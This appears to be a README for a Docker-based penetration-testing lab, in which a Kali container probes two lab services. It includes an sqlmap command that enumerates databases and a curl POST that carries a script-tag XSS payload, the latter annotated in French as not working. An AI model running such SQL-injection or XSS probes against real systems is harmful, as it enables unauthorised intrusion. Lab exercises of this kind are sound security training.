### Run docker compose
```
docker-compose up --build
```
## Open  shell in `kali_pentest` container
```
docker exec -it kali_pentest /bin/
```

## Install ping command
```
apt-get install -y iputils-ping
```

## Use ping command to check connectivity to `php_web`
```
ping php_web
```

## Use pingcommand to check connectivity to `internal_api`
```
ping interal_api
```

## Insall sqlmap for SQL Injection
```
apt-get install -y sqlmap
```
example:
```
sqlmap -u "http://internal_api/api.php" --data="nom=Test&prix=50" --dbs
```

## Install curl command for XSS
```
apt-get install -y curl
```
example:
pas fonctionne
```
curl -X POST -d "nom=<script>alert('XSS Test')</script>&prix=4.50" http://php_web/index.php
```

## Monitor the logs:
```
docker logs internal_api
docker logs php_web
```

